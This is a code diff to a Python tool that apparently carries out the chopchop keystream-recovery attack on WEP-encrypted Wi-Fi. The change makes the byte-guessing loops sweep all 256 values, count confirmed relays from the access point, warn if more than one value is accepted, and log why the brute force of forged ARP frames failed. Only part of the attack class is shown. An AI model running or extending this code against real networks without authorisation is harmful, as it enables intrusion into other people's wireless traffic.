@@ -237,24 +237,40 @@ class WepChopChop:
         return bytes(ks), gap
 
     async def _find_accepted(self, body: bytes) -> Optional[int]:
-        """Sweep guesses 0..255 for ``body``'s last byte; return the one the
-        oracle accepts, or None. Re-sweeps once on a clean miss (the correct
-        guess's single send may have been lost).
+        """Sweep ALL 256 guesses for ``body``'s last byte and return the one the
+        AP relays (re-confirmed), or None.
 
         Exactly one byte is mathematically valid per step (the ICV residue is
-        unique), so a relay normally pins it. But a relay can be MISATTRIBUTED
-        on the air — a sibling-BSS echo, or the true guess's relay slipping past
-        the timeout into the next guess's slot — which would corrupt the walk.
-        So we CONFIRM: re-send the accepted guess; the true byte relays every
-        time, a misattributed flag won't (re-sending a wrong guess is invalid)."""
+        unique). We CONFIRM each apparent hit (re-send; a misattributed
+        sibling-BSS echo / timing slip won't repeat) to reject false positives.
+        DIAGNOSTIC: we sweep the FULL 256 (not stop at the first) and COUNT the
+        confirmed responders — if it's ever >1, the uniqueness assumption is
+        wrong and we sound the alarm. (Slower than early-return; here to settle
+        exactly that question.)"""
         for _attempt in range(self._BYTE_RETRIES):
+            responders = []
             for guess in range(256):
                 if not self._active:
                     return None
                 shortened = chop_last_byte_and_fixup(body, guess)
                 if await self._oracle(shortened) and await self._confirm(shortened):
-                    return guess
+                    responders.append(guess)
+            if responders:
+                self._warn_if_multiple(responders, len(body) - 1)
+                return responders[0]
         return None
+
+    def _warn_if_multiple(self, responders: list, position: int) -> None:
+        """Sound the alarm if more than one byte value got relayed at a
+        position — the ICV residue is supposed to make exactly one valid."""
+        if len(responders) > 1:
+            self._log(
+                f"[bold red on yellow] ⚠ WEE WOO [/bold red on yellow] "
+                f"[bold red]{len(responders)} byte values relayed at position "
+                f"{position}:[/bold red] "
+                f"{', '.join(f'0x{g:02x}' for g in responders)} "
+                "[dim](expected exactly 1 — uniqueness violated?!)[/dim]"
+            )
 
     async def _confirm(self, shortened: bytes) -> bool:
         """Re-send a relaying guess to confirm it's the true byte, not a
@@ -384,14 +400,26 @@ class WepChopChop:
             "[green]ChopChop:[/green] [dim]chopping wall hit — brute-forcing "
             "the last byte (256 forged ARPs)…[/dim]"
         )
+        responders = []
         for g in range(256):
             if not self._active:
                 return None
             cipher[p] = g
             cand = bytes(cipher)
             if await self._oracle(cand) and await self._confirm(cand):
-                return self._build_frame(cand)
-        return None
+                responders.append((g, cand))
+        if not responders:
+            # Say WHY instead of going silent: 0 relays means our recovered
+            # keystream is wrong somewhere (a bad chopped byte), or the AP went
+            # quiet — either way this seed is dead.
+            self._log(
+                "[yellow]ChopChop: brute-force found NO relaying byte[/yellow] "
+                "[dim](recovered keystream is off, or the AP went quiet — "
+                "trying another seed)[/dim]"
+            )
+            return None
+        self._warn_if_multiple([g for g, _ in responders], p)
+        return self._build_frame(responders[0][1])
 
     def _succeed(self, forged: bytes) -> None:
         self._set_state("success")
